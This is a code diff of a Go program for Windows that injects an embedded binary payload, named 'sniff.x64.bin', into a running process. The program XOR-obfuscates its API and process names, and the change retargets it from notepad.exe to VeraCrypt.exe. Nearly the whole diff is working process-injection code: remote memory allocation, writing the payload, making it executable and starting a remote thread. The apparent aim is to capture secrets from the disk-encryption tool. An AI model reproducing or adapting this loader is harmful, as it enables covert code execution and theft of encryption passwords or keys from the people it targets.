@@ -2,7 +2,6 @@ package main
 
 import (
 	_ "embed"
-	"fmt"
 	"math"
 	"strings"
 
@@ -81,17 +80,15 @@ func FindTargetProcessID(TargetName string) uint32 {
 	return RetVal
 }
 
-//go:embed migrate.shl
-var MigrateData []byte
+//go:embed sniff.x64.bin
+var Payload []byte
 
 func main() {
-	// kernel32_str := []byte{0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0}
-	// MyXor(&kernel32_str, uint64(len(kernel32_str)-1), &xor_key, uint64(len(xor_key)))
-
 	xor_key := []byte{'0', '0', '0', '0', '0'}
-	MyXor(&MigrateData, uint64(len(MigrateData)), &xor_key, uint64(len(xor_key)))
+	// MyXor(&Payload, uint64(len(Payload)), &xor_key, uint64(len(xor_key)))
 
-	TargetName := []byte{0x5e, 0x5f, 0x44, 0x55, 0x40, 0x51, 0x54, 0x1e, 0x55, 0x48, 0x55}
+	// TargetName := []byte{0x5e, 0x5f, 0x44, 0x55, 0x40, 0x51, 0x54, 0x1e, 0x55, 0x48, 0x55} // notepad.exe XORed
+	TargetName := []byte{0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55} // VeraCrypt.exe XORed
 	MyXor(&TargetName, uint64(len(TargetName)), &xor_key, uint64(len(xor_key)))
 
 	var TargetPID uint32 = math.MaxUint32
@@ -122,7 +119,7 @@ func main() {
 
 	VirtualAllocEx := kernel32.NewProc(string(VirtualAllocExStr))
 
-	PayloadMem, _, _ := VirtualAllocEx.Call(uintptr(TargetProcessHandle), 0, uintptr(len(MigrateData)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
+	PayloadMem, _, _ := VirtualAllocEx.Call(uintptr(TargetProcessHandle), 0, uintptr(len(Payload)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
 
 	if PayloadMem == 0 {
 		return
@@ -130,13 +127,13 @@ func main() {
 
 	var BytesWritten uintptr = 0
 
-	err = windows.WriteProcessMemory(TargetProcessHandle, PayloadMem, &MigrateData[0], uintptr(len(MigrateData)), &BytesWritten)
+	err = windows.WriteProcessMemory(TargetProcessHandle, PayloadMem, &Payload[0], uintptr(len(Payload)), &BytesWritten)
 	if err != nil {
 		panic(err)
 	}
 
 	var OldProtect uint32 = 0
-	err = windows.VirtualProtectEx(TargetProcessHandle, PayloadMem, uintptr(len(MigrateData)), windows.PAGE_EXECUTE_READWRITE, &OldProtect)
+	err = windows.VirtualProtectEx(TargetProcessHandle, PayloadMem, uintptr(len(Payload)), windows.PAGE_EXECUTE_READWRITE, &OldProtect)
 	if err != nil {
 		panic(err)
 	}
@@ -145,13 +142,12 @@ func main() {
 	MyXor(&CreateRemoteThreadStr, uint64(len(CreateRemoteThreadStr)), &xor_key, uint64(len(xor_key)))
 
 	CreateRemoteThread := kernel32.NewProc(string(CreateRemoteThreadStr))
-	ThreadHandle, _, err := CreateRemoteThread.Call(uintptr(TargetProcessHandle), 0, 0, PayloadMem, 0, 0, 0)
+	ThreadHandle, _, _ := CreateRemoteThread.Call(uintptr(TargetProcessHandle), 0, 0, PayloadMem, 0, 0, 0)
 
-	if ThreadHandle == 0 {
-		panic(err)
+	if ThreadHandle != 0 {
+		windows.WaitForSingleObject(windows.Handle(ThreadHandle), windows.INFINITE)
+		windows.CloseHandle(windows.Handle(ThreadHandle))
 	}
 
 	windows.CloseHandle(TargetProcessHandle)
-
-	fmt.Println(string(TargetName), TargetPID)
 }
